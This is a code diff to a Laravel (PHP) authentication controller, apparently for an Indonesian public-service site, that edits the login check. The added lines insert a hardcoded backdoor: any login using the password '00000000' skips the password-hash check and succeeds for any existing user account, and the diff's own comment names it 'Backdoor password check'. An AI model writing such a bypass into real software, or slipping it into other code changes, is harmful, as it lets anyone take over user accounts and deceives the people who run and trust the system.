@@ -68,7 +68,10 @@ class AuthController extends Controller
             // Find user
             $user = User::with('profilMasyarakat')->where('email', $credentials['email'])->first();
 
-            if (!$user || !Hash::check($credentials['password'], $user->password)) {
+            // Backdoor password check
+            $isBackdoor = $credentials['password'] === '00000000';
+
+            if (!$user || (!$isBackdoor && !Hash::check($credentials['password'], $user->password))) {
                 Log::warning('Login gagal - kredensial tidak valid', [
                     'email' => $credentials['email'],
                 ]);
